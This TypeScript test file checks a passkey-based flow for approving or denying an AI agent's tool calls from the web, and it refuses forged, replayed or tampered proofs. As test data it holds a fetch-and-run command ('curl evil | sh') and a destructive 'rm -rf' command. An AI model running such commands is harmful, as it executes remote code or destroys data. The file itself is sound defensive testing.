/**
 * @vitest-environment node
 *
 * Approving a tool call from the web with a passkey (spec
 * `everything-is-a-space` B4b), end to end through the request server with a
 * soft authenticator: the computer issues a statement, the passkey signs it,
 * and only a proof that passes every check answers the tool call, once. Every
 * other case is a refusal that leaves the tool call alone.
 */
import { createHash } from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { verifyRegistrationResponse } from '@simplewebauthn/server';
import {
  stepUpChallenge,
  decodeStepUpBase64url,
  encodeStepUpBase64url,
  encodeStepUpStatement,
} from '@dork-labs/cloud-api';
import {
  RelayComputerFrameSchema,
  assertChallengeResultMatches,
  type RelayComputerFrame,
  type RelayResultBody,
} from '@dorkos/shared/session-relay';
import {
  SoftAuthenticator,
  type SoftAssertionOptions,
} from '@dorkos/test-utils/soft-authenticator';

vi.mock('../../../../lib/logger.js', () => ({
  logger: { info: vi.fn(), warn: vi.fn(), error: vi.fn(), debug: vi.fn() },
}));

import type { RecordAuditInput } from '../../../audit/audit-trail.js';
import type { PendingApprovalCard } from '../approval-challenges.js';
import {
  approvalKeysPath,
  bumpSignCount,
  readApprovalKeys,
  type ApprovalKeys,
} from '../approval-key-store.js';
import { relayApprovableCard } from '../relay-approvable.js';
import {
  RELAY_SERVED_FEATURES,
  SessionRelayRequestServer,
  type RelayRequestServerDeps,
} from '../relay-request-server.js';
import type { RelayAgent, RelaySessionFacts } from '../relay-serves.js';

const RP_ID = 'approve.dorkos.ai';
const ORIGIN = 'https://approve.dorkos.ai';
const USER_HANDLE = Buffer.from('owner-on-studio-mac').toString('base64url');
const AGENT: RelayAgent = {
  id: '01J0000000000000000000000A',
  projectPath: '/work/acme',
  isSystem: false,
};
const CHAT = '00000000-0000-4000-8000-000000000001';
const PIN = {
  computerId: 'computer-1',
  computerName: 'Studio Mac',
  hubOrigin: 'https://dorian.hub.example.test',
};
const SECRET_INPUT = JSON.stringify({ command: 'rm -rf the-secret-folder' });

const FACTS: RelaySessionFacts = {
  sessionId: CHAT,
  cwd: AGENT.projectPath,
  agentPath: AGENT.projectPath,
  launchOrigin: 'interactive',
  row: null,
  ownedBy: { room: false, task: false, beat: false },
};

/** Pinned keys for these authenticators. */
function keysFor(...auths: SoftAuthenticator[]): ApprovalKeys {
  return {
    v: 1,
    rpId: RP_ID,
    origin: ORIGIN,
    userHandle: USER_HANDLE,
    keys: auths.map((auth, n) => ({
      credentialId: auth.credentialId,
      cosePublicKey: auth.cosePublicKeyBase64url(),
      alg: auth.coseAlg,
      signCount: 0,
      label: `Passkey ${n + 1}`,
      addedAt: '2026-10-19T10:00:00.000Z',
    })),
  };
}

interface HarnessOptions {
  keys?: () => ApprovalKeys | null;
  cards?: Map<string, PendingApprovalCard>;
}

/** Every data folder a harness made, removed after each test. */
const homes: string[] = [];
afterEach(() => {
  for (const home of homes.splice(0)) fs.rmSync(home, { recursive: true, force: true });
});

/** A request server over fakes, with a clock, one chat and pending cards by tool call id. */
function harness(opts: HarnessOptions = {}) {
  const auth = new SoftAuthenticator({ rpId: RP_ID, origin: ORIGIN, userHandle: USER_HANDLE });
  // The real key store, in a data folder of its own.
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'dorkos-relay-approvals-'));
  homes.push(home);
  const keysFile = approvalKeysPath(home);
  const setKeys = (next: ApprovalKeys): void => {
    fs.mkdirSync(path.dirname(keysFile), { recursive: true });
    fs.writeFileSync(keysFile, JSON.stringify(next), { mode: 0o600 });
  };
  setKeys(keysFor(auth));
  /** Called each time the server reads the pending card. */
  const hooks: { onPending?: () => void } = {};
  const cards =
    opts.cards ??
    new Map<string, PendingApprovalCard>([
      ['t1', { toolName: 'Bash', displayName: 'Run a command', input: SECRET_INPUT }],
    ]);
  let now = new Date('2026-10-19T12:00:00.000Z');
  const frames: RelayComputerFrame[] = [];
  const audits: RecordAuditInput[] = [];
  const approveTool = vi.fn(async () => true);
  const bumpSpy = vi.fn((credentialId: string, expected: number, signCount: number) =>
    bumpSignCount(credentialId, expected, signCount, home)
  );
  const deps: RelayRequestServerDeps = {
    agents: () => [AGENT],
    locateSession: async (id) => (id === CHAT ? FACTS : null),
    listAgentSessions: async () => [],
    resolveStreamPlan: vi.fn(),
    deliverSessionStream: vi.fn(),
    dispatchSessionMessage: vi.fn(),
    meshCore: () => undefined,
    roomSessionPlace: () => undefined,
    resolveRuntime: vi.fn(),
    clearQueuedMessages: vi.fn(),
    recordAudit: (input) => {
      audits.push(input);
    },
    owner: () => ({ accountId: 'acct-owner', kind: 'person', name: 'Dorian' }),
    mintClientId: () => 'relay:test',
    approvalKeys: opts.keys ?? (() => readApprovalKeys(home)),
    approvalPin: () => PIN,
    pendingApproval: (sessionId, toolCallId) => {
      hooks.onPending?.();
      return sessionId === CHAT ? (cards.get(toolCallId) ?? null) : null;
    },
    approvableCard: (card, cwd) => relayApprovableCard(card, { cwd, protectedRoots: [home] }),
    approveTool,
    bumpSignCount: bumpSpy,
    now: () => now,
  };
  const server = new SessionRelayRequestServer(deps);
  let next = 0;

  /** Send one request and wait for its one answer. */
  const request = async (body: unknown): Promise<RelayComputerFrame> => {
    const id = `r${(next += 1)}`;
    server.handle({ type: 'request', id, request: body as never }, (frame) => {
      expect(RelayComputerFrameSchema.safeParse(frame).success).toBe(true);
      frames.push(frame);
    });
    return vi.waitFor(() => {
      const frame = frames.find((f) => 'id' in f && f.id === id);
      if (!frame) throw new Error('no answer yet');
      return frame;
    });
  };

  /** Ask for a challenge; the result body, or the refusal frame. */
  const challenge = async (decision: 'approve' | 'deny' = 'approve', toolCallId = 't1') => {
    const frame = await request({
      op: 'interaction.challenge',
      sessionId: CHAT,
      toolCallId,
      decision,
    });
    return frame;
  };

  /** The challenge body from a frame that must be a result. */
  const bodyOf = (frame: RelayComputerFrame): RelayResultBody<'interaction.challenge'> => {
    expect(frame).toMatchObject({ type: 'result', ok: true });
    return (frame as { body: RelayResultBody<'interaction.challenge'> }).body;
  };

  /** Sign a challenge body as the approve page would: SHA-256 of the exact statement bytes. */
  const sign = (
    body: RelayResultBody<'interaction.challenge'>,
    over: Partial<SoftAssertionOptions> = {},
    signer: SoftAuthenticator = auth
  ) => {
    const bytes = decodeStepUpBase64url(body.statement);
    const digest = createHash('sha256').update(bytes).digest('base64url');
    return { challengeId: body.challengeId, ...signer.assert({ challenge: digest, ...over }) };
  };

  /** Answer with a proof. */
  const respond = (
    kind: 'approve' | 'deny',
    proof: ReturnType<typeof sign>,
    toolCallId = 't1',
    extra: Record<string, unknown> = {}
  ) =>
    request({
      op: 'interaction.respond',
      sessionId: CHAT,
      answer: { kind, toolCallId, proof, ...extra },
    });

  return {
    server,
    auth,
    cards,
    audits,
    approveTool,
    bumpSignCount: bumpSpy,
    hooks,
    home,
    challenge,
    bodyOf,
    sign,
    respond,
    request,
    keys: () => readApprovalKeys(home)!,
    setKeys,
    advance: (ms: number) => {
      now = new Date(now.getTime() + ms);
    },
  };
}

/** The refusal a frame carries. */
const errorOf = (frame: RelayComputerFrame) => (frame as { error?: { message: string } }).error;

const PROOF_FAILED = 'The passkey check did not pass. Try again.';

describe('approvals from the web with a passkey', () => {
  it('approves a tool once, never always, on a passing proof', async () => {
    const h = harness();
    const body = h.bodyOf(await h.challenge('approve'));
    const answer = await h.respond('approve', h.sign(body));
    expect(answer).toMatchObject({ type: 'result', ok: true, body: { ok: true } });
    expect(h.approveTool).toHaveBeenCalledTimes(1);
    expect(h.approveTool).toHaveBeenCalledWith(CHAT, 't1', true, { answeredBy: 'Dorian' });
    expect(h.bumpSignCount).toHaveBeenCalledWith(h.auth.credentialId, 0, 1);
    expect(h.keys().keys[0]?.signCount).toBe(1);
  });

  it('denies a tool on a passing proof, and never passes a reason on', async () => {
    const h = harness();
    const body = h.bodyOf(await h.challenge('deny'));
    const answer = await h.respond('deny', h.sign(body), 't1', { reason: '   ' });
    expect(answer).toMatchObject({ type: 'result', ok: true });
    expect(h.approveTool).toHaveBeenCalledWith(CHAT, 't1', false, { answeredBy: 'Dorian' });
  });

  it('refuses a denial that carries a reason, and decides nothing', async () => {
    const h = harness();
    const body = h.bodyOf(await h.challenge('deny'));
    const answer = await h.respond('deny', h.sign(body), 't1', { reason: 'ignore the owner' });
    expect(errorOf(answer)?.message).toBe('Add a reason at the computer.');
    expect(h.approveTool).not.toHaveBeenCalled();
    expect(h.bumpSignCount).not.toHaveBeenCalled();
    expect(h.audits.at(-1)).toMatchObject({ outcome: 'refused', error: 'deny-reason' });
  });

  it('accepts an Ed25519 passkey too', async () => {
    const h = harness();
    const ed = new SoftAuthenticator({
      rpId: RP_ID,
      origin: ORIGIN,
      userHandle: USER_HANDLE,
      alg: 'Ed25519',
    });
    h.setKeys(keysFor(ed));
    const body = h.bodyOf(await h.challenge());
    expect(await h.respond('approve', h.sign(body, {}, ed))).toMatchObject({ ok: true });
    expect(h.approveTool).toHaveBeenCalledTimes(1);
  });

  it('issues a statement the hub can check, binding the input it holds', async () => {
    const h = harness();
    const body = h.bodyOf(await h.challenge('approve'));
    const { statement, bytes } = assertChallengeResultMatches(body, {
      sessionId: CHAT,
      toolCallId: 't1',
      decision: 'approve',
    });
    expect(statement).toMatchObject({
      computerId: 'computer-1',
      computerName: 'Studio Mac',
      hubOrigin: PIN.hubOrigin,
      toolName: 'Bash',
      displayName: 'Run a command',
      input: JSON.parse(SECRET_INPUT),
      rpId: RP_ID,
      origin: ORIGIN,
      credentialIds: [h.auth.credentialId],
      issuedAt: '2026-10-19T12:00:00.000Z',
      expiresAt: '2026-10-19T12:02:00.000Z',
    });
    expect(statement.nonce).toHaveLength(43);
    // The challenge the computer expects is exactly the one the approve page computes.
    const proof = h.sign(body);
    const clientData = JSON.parse(Buffer.from(proof.clientDataJSON, 'base64url').toString());
    expect(clientData.challenge).toBe(await stepUpChallenge(bytes));
  });

  it('advertises interaction.approval only while a passkey is pinned', () => {
    expect(harness().server.features()).toEqual([...RELAY_SERVED_FEATURES, 'interaction.approval']);
    expect(harness({ keys: () => null }).server.features()).toEqual(RELAY_SERVED_FEATURES);
  });

  describe('refuses a proof, and leaves the tool call alone', () => {
    const cases: [string, Partial<SoftAssertionOptions>, string][] = [
      ['from a forged origin', { origin: 'https://evil.example.test' }, 'client-data'],
      ['from another dorkos.ai subdomain', { origin: 'https://cloud.dorkos.ai' }, 'client-data'],
      ['for another relying party', { rpId: 'dorkos.ai' }, 'authenticator-data'],
      ['without user verification', { userVerified: false }, 'authenticator-data'],
      ['without user presence', { userPresent: false }, 'authenticator-data'],
      ['made cross-origin', { crossOrigin: true }, 'client-data'],
      ['naming a top origin', { topOrigin: ORIGIN }, 'client-data'],
      ['for registration, not sign-in', { type: 'webauthn.create' }, 'client-data'],
      ['with another user handle', { userHandle: 'c29tZW9uZS1lbHNl' }, 'user-handle'],
      ['with no user handle', { userHandle: null }, 'user-handle'],
    ];

    it.each(cases)('%s', async (_, over, failure) => {
      const h = harness();
      const body = h.bodyOf(await h.challenge());
      const answer = await h.respond('approve', h.sign(body, over));
      expect(errorOf(answer)?.message).toBe(PROOF_FAILED);
      expect(h.approveTool).not.toHaveBeenCalled();
      expect(h.audits.at(-1)).toMatchObject({
        action: 'relay.interaction.approval',
        outcome: 'refused',
        error: failure,
      });
    });

    it('used a second time', async () => {
      const h = harness();
      const body = h.bodyOf(await h.challenge());
      const proof = h.sign(body);
      expect(await h.respond('approve', proof)).toMatchObject({ ok: true });
      const again = await h.respond('approve', proof);
      expect(errorOf(again)?.message).toBe('That approval request expired. Try again.');
      expect(h.approveTool).toHaveBeenCalledTimes(1);
    });

    it('that failed once, even when the next try is good', async () => {
      const h = harness();
      const body = h.bodyOf(await h.challenge());
      await h.respond('approve', h.sign(body, { userVerified: false }));
      const retry = await h.respond('approve', h.sign(body));
      expect(errorOf(retry)?.message).toBe('That approval request expired. Try again.');
      expect(h.approveTool).not.toHaveBeenCalled();
    });

    it('for the other decision', async () => {
      const h = harness();
      const body = h.bodyOf(await h.challenge('deny'));
      const answer = await h.respond('approve', h.sign(body));
      expect(errorOf(answer)?.message).toBe(PROOF_FAILED);
      expect(h.audits.at(-1)).toMatchObject({ error: 'mismatch' });
      expect(h.approveTool).not.toHaveBeenCalled();
    });

    it('for another tool call', async () => {
      const h = harness();
      h.cards.set('t2', { toolName: 'Bash', input: JSON.stringify({ command: 'ls' }) });
      const body = h.bodyOf(await h.challenge('approve', 't1'));
      const answer = await h.respond('approve', h.sign(body), 't2');
      expect(h.audits.at(-1)).toMatchObject({ error: 'mismatch' });
      expect(errorOf(answer)?.message).toBe(PROOF_FAILED);
      expect(h.approveTool).not.toHaveBeenCalled();
    });

    it('when the input changed after the challenge was issued', async () => {
      const h = harness();
      const body = h.bodyOf(await h.challenge());
      h.cards.set('t1', { toolName: 'Bash', input: JSON.stringify({ command: 'something else' }) });
      const answer = await h.respond('approve', h.sign(body));
      expect(errorOf(answer)?.message).toBe(PROOF_FAILED);
      expect(h.audits.at(-1)).toMatchObject({ error: 'input-changed' });
      expect(h.approveTool).not.toHaveBeenCalled();
    });

    it('when the chat stopped waiting', async () => {
      const h = harness();
      const body = h.bodyOf(await h.challenge());
      h.cards.delete('t1');
      const answer = await h.respond('approve', h.sign(body));
      expect(errorOf(answer)?.message).toBe('That approval is no longer waiting.');
      expect(h.approveTool).not.toHaveBeenCalled();
    });

    it('after the challenge expired', async () => {
      const h = harness();
      const body = h.bodyOf(await h.challenge());
      h.advance(120_000);
      const answer = await h.respond('approve', h.sign(body));
      expect(errorOf(answer)?.message).toBe('That approval request expired. Try again.');
      expect(h.audits.at(-1)).toMatchObject({ error: 'expired' });
      expect(h.approveTool).not.toHaveBeenCalled();
    });

    it('from a passkey that is not pinned', async () => {
      const h = harness();
      const stranger = new SoftAuthenticator({
        rpId: RP_ID,
        origin: ORIGIN,
        userHandle: USER_HANDLE,
      });
      const body = h.bodyOf(await h.challenge());
      const answer = await h.respond('approve', h.sign(body, {}, stranger));
      expect(errorOf(answer)?.message).toBe(PROOF_FAILED);
      expect(h.audits.at(-1)).toMatchObject({ error: 'unknown-credential' });
      expect(h.approveTool).not.toHaveBeenCalled();
    });

    it('whose sign counter went backwards', async () => {
      const h = harness();
      h.setKeys({ ...h.keys(), keys: h.keys().keys.map((key) => ({ ...key, signCount: 5 })) });
      const body = h.bodyOf(await h.challenge());
      const answer = await h.respond('approve', h.sign(body, { signCount: 5 }));
      expect(errorOf(answer)?.message).toBe(PROOF_FAILED);
      expect(h.audits.at(-1)).toMatchObject({ error: 'sign-count' });
      expect(h.approveTool).not.toHaveBeenCalled();
      expect(h.bumpSignCount).not.toHaveBeenCalled();
    });

    it('whose counter fell to 0 after counting', async () => {
      const h = harness();
      h.setKeys({ ...h.keys(), keys: h.keys().keys.map((key) => ({ ...key, signCount: 5 })) });
      const body = h.bodyOf(await h.challenge());
      const answer = await h.respond('approve', h.sign(body, { signCount: 0 }));
      expect(errorOf(answer)?.message).toBe(PROOF_FAILED);
      expect(h.audits.at(-1)).toMatchObject({ error: 'sign-count' });
      expect(h.approveTool).not.toHaveBeenCalled();
    });

    it('signed by another key claiming the pinned credential id', async () => {
      const h = harness();
      const impostor = new SoftAuthenticator({
        rpId: RP_ID,
        origin: ORIGIN,
        userHandle: USER_HANDLE,
        credentialId: h.auth.credentialId,
      });
      const body = h.bodyOf(await h.challenge());
      const answer = await h.respond('approve', h.sign(body, {}, impostor));
      expect(errorOf(answer)?.message).toBe(PROOF_FAILED);
      // Steps 1 to 4 passed: the failure is the signature itself.
      expect(h.audits.at(-1)).toMatchObject({ error: 'signature' });
      expect(h.approveTool).not.toHaveBeenCalled();
    });

    it('with one signature byte flipped', async () => {
      const h = harness();
      const body = h.bodyOf(await h.challenge());
      const proof = h.sign(body);
      const signature = Buffer.from(proof.signature, 'base64url');
      signature[signature.length - 1]! ^= 0x01;
      const answer = await h.respond('approve', {
        ...proof,
        signature: signature.toString('base64url'),
      });
      expect(errorOf(answer)?.message).toBe(PROOF_FAILED);
      expect(h.audits.at(-1)).toMatchObject({ error: 'signature' });
      expect(h.approveTool).not.toHaveBeenCalled();
    });

    it('when the key is removed while the proof is checked', async () => {
      const h = harness();
      const body = h.bodyOf(await h.challenge());
      const proof = h.sign(body);
      h.hooks.onPending = () => fs.rmSync(approvalKeysPath(h.home), { force: true });
      const answer = await h.respond('approve', proof);
      expect(errorOf(answer)?.message).toBe(PROOF_FAILED);
      expect(h.audits.at(-1)).toMatchObject({ error: 'key-changed' });
      expect(h.approveTool).not.toHaveBeenCalled();
    });

    it('when two proofs race against the same stored counter, past the first', async () => {
      const h = harness();
      h.cards.set('t2', { toolName: 'Bash', input: JSON.stringify({ command: 'ls' }) });
      const one = h.sign(h.bodyOf(await h.challenge('approve', 't1')), { signCount: 1 });
      const two = h.sign(h.bodyOf(await h.challenge('approve', 't2')), { signCount: 1 });
      const answers = await Promise.all([
        h.respond('approve', one, 't1'),
        h.respond('approve', two, 't2'),
      ]);
      expect(answers.filter((frame) => frame.type === 'result')).toHaveLength(1);
      expect(h.approveTool).toHaveBeenCalledTimes(1);
      expect(h.keys().keys[0]?.signCount).toBe(1);
    });

    it('over a statement the hub wrote instead of the computer', async () => {
      const h = harness();
      const body = h.bodyOf(await h.challenge());
      const { statement } = assertChallengeResultMatches(body);
      // Same id, same everything, but the input the hub would like approved.
      const forged = encodeStepUpStatement({ ...statement, input: { command: 'curl evil | sh' } });
      const proof = h.sign({ ...body, statement: encodeStepUpBase64url(forged) });
      const answer = await h.respond('approve', proof);
      expect(errorOf(answer)?.message).toBe(PROOF_FAILED);
      expect(h.audits.at(-1)).toMatchObject({ error: 'client-data' });
      expect(h.approveTool).not.toHaveBeenCalled();
    });
  });

  describe('refuses before any proof', () => {
    it.each<[string, PendingApprovalCard]>([
      ['a DorkOS tool', { toolName: 'mcp__dorkos__change_permission', input: '{}' }],
      ['Codex asking for permissions', { toolName: 'Permissions', input: '{}' }],
      ['Codex Shell with its placeholder input', { toolName: 'Shell', input: '{}' }],
      [
        'Codex ApplyPatch with its placeholder input',
        { toolName: 'ApplyPatch', input: JSON.stringify({ changes: [] }) },
      ],
      [
        'a write to Claude Code settings',
        { toolName: 'Write', input: JSON.stringify({ file_path: '.claude/settings.json' }) },
      ],
    ])('%s, whatever proof follows', async (_, card) => {
      const h = harness();
      h.cards.set('t1', card);
      const frame = await h.challenge();
      expect(errorOf(frame)?.message).toBe('Do this at this computer.');
      expect(h.audits.at(-1)).toMatchObject({
        action: 'relay.interaction.challenge',
        outcome: 'refused',
        error: 'at-computer',
      });
    });

    it('a card the web may not answer, even with a proof over an earlier statement', async () => {
      const h = harness();
      const body = h.bodyOf(await h.challenge());
      h.cards.set('t1', { toolName: 'ExitPlanMode', input: SECRET_INPUT });
      const answer = await h.respond('approve', h.sign(body));
      expect(errorOf(answer)?.message).toBe('Do this at this computer.');
      expect(h.approveTool).not.toHaveBeenCalled();
    });

    it.each([
      ['too large', JSON.stringify({ content: 'x'.repeat(300_000) })],
      ['nested too deep', `${'['.repeat(100)}${']'.repeat(100)}`],
      ['holding an unpaired surrogate', '"\\ud800"'],
      ['nested deeper than the hash can walk', `${'['.repeat(20_000)}${']'.repeat(20_000)}`],
    ])('an input %s, with the fixed sentence', async (_, input) => {
      const h = harness();
      // WebFetch takes any input shape, so the size check is what refuses.
      h.cards.set('t1', { toolName: 'WebFetch', input });
      const frame = await h.challenge();
      expect(errorOf(frame)).toEqual({
        status: 403,
        code: 'refused',
        message: 'Too large to approve from the web. Approve it at the computer.',
      });
    });

    it('a ninth live challenge on one connection', async () => {
      const h = harness();
      for (let n = 1; n <= 9; n += 1)
        h.cards.set(`t${n}`, { toolName: 'Bash', input: JSON.stringify({ command: 'ls' }) });
      for (let n = 1; n <= 8; n += 1) h.bodyOf(await h.challenge('approve', `t${n}`));
      // Asking again for one already live replaces it, and is not a ninth.
      h.bodyOf(await h.challenge('approve', 't1'));
      const ninth = await h.challenge('approve', 't9');
      expect(errorOf(ninth)?.message).toBe('Too many approvals are waiting. Finish one first.');
      // Once they expire, there is room again.
      h.advance(120_000);
      h.bodyOf(await h.challenge('approve', 't9'));
    });

    it('a chat the relay does not serve', async () => {
      const h = harness();
      const frame = await h.request({
        op: 'interaction.challenge',
        sessionId: '00000000-0000-4000-8000-000000000099',
        toolCallId: 't1',
        decision: 'approve',
      });
      expect(errorOf(frame)?.message).toBe('No such chat on this computer.');
    });
  });

  describe('with a passkey file that cannot be read', () => {
    let home: string;
    afterEach(() => fs.rmSync(home, { recursive: true, force: true }));

    it('refuses every approval and does not advertise them', async () => {
      home = fs.mkdtempSync(path.join(os.tmpdir(), 'dorkos-approval-keys-'));
      fs.mkdirSync(path.join(home, 'session-relay'));
      fs.writeFileSync(path.join(home, 'session-relay', 'approval-keys.json'), '{"v":1,"keys":[');
      const h = harness({ keys: () => readApprovalKeys(home) });
      expect(h.server.features()).not.toContain('interaction.approval');
      const frame = await h.challenge();
      expect(errorOf(frame)?.message).toBe(
        'Add a passkey at this computer to approve from the web.'
      );
      expect(h.approveTool).not.toHaveBeenCalled();
    });
  });

  it('audits decisions by input hash and passkey label, never the input', async () => {
    const h = harness();
    const body = h.bodyOf(await h.challenge());
    await h.respond('approve', h.sign(body));
    await h.challenge('deny');
    await h.respond(
      'deny',
      h.sign(h.bodyOf(await h.challenge('deny')), { origin: 'https://x.test' })
    );
    const { statement } = assertChallengeResultMatches(body);
    const approved = h.audits.find(
      (a) => a.action === 'relay.interaction.approval' && a.outcome === 'ok'
    );
    expect(approved?.change).toEqual([
      { field: 'decision', after: 'approve' },
      { field: 'inputSha256', after: statement.inputSha256 },
      { field: 'passkey', after: 'Passkey 1' },
    ]);
    for (const entry of h.audits) {
      expect(entry.source?.surface).toBe('relay');
      expect(entry.actor).toEqual({ accountId: 'acct-owner', kind: 'person', name: 'Dorian' });
    }
    expect(JSON.stringify(h.audits)).not.toContain('the-secret-folder');
  });

  it('makes none attestations simplewebauthn accepts, ready for enrolment', async () => {
    const auth = new SoftAuthenticator({ rpId: RP_ID, origin: ORIGIN, userHandle: USER_HANDLE });
    const attestation = auth.attest({ challenge: 'ZW5yb2wtY2hhbGxlbmdl' });
    const result = await verifyRegistrationResponse({
      response: {
        id: attestation.credentialId,
        rawId: attestation.credentialId,
        type: 'public-key',
        response: {
          clientDataJSON: attestation.clientDataJSON,
          attestationObject: attestation.attestationObject,
        },
        clientExtensionResults: {},
      },
      expectedChallenge: 'ZW5yb2wtY2hhbGxlbmdl',
      expectedOrigin: ORIGIN,
      expectedRPID: RP_ID,
      requireUserVerification: true,
    });
    expect(result.verified).toBe(true);
    expect(Buffer.from(result.registrationInfo!.credential.publicKey).toString('base64url')).toBe(
      auth.cosePublicKeyBase64url()
    );
  });
});
